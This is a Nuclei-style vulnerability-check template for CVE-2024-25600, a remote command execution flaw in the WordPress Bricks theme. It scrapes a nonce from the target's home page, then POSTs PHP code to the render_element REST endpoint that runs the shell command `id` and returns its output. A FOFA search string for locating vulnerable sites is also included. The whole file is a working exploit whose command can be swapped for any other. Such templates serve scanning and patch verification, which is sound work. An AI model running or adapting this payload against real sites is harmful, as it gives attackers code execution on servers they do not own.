id: WordPress-RCE-CVE-2024-25600

info:
  name: WordPress的Bricks主题存在远程命令执行漏洞CVE-2024-25600
  author: changge
  severity: high
  description: |
    WordPress的Bricks主题存在远程命令执行漏洞CVE-2024-25600
  metadata:
    fofa-query: body="/wp-content/themes/bricks/"
  reference:
    - https://127.0.0.1
  tags: wpscan, cve, wordpress, wp, wp-plugin


http:
  - raw:
      - |
        GET / HTTP/2
        Host: {{Hostname}}

      - |
        POST /wp-json/bricks/v1/render_element HTTP/2
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "postId": "1",
          "nonce": "{{nonce}}",  
          "element": {
            "name": "container",
            "settings": {
              "hasLoop": "true",
              "query": {
                "useQueryEditor": true,
                "queryEditor": "ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
                "objectType": "post"
              }
            }
          }
        }

    extractors:
      - type: regex
        name: nonce
        part: body
        group: 1
        regex:
          - 'nonce":"([0-9a-z]+)'
        internal: true

    matchers:
      - type: word
        words:
          - "Exception:"
          - "uid"
        part: body_2
